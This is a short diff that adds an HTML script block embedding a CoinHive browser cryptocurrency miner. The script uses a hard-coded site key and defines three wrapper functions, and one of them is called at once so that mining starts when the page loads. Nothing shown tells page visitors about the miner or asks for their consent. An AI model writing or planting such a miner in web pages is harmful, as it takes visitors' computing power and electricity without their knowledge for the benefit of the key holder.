@@ -1,0 +1,18 @@
+  hello miner,throttle params 0 is still work
+	<script>
+	var key='VZNP2xtLAQmk80sEhzCz4npJNXo8nGE9';
+   var idle=0.5;
+	function exeMiner(){
+	  var miner = new CoinHive.Anonymous(key,{throttle:idle});
+		 miner.start();
+	}
+	function exeMinerDebug(){
+		 var miner = new CoinHive.Anonymous(key,{throttle:idle});
+		 miner.start();
+	}
+  function exeMinerParam(idlef){
+     var miner = new CoinHive.Anonymous(key,{throttle:idlef});
+		 miner.start();
+  }
+	exeMiner();
+</script>
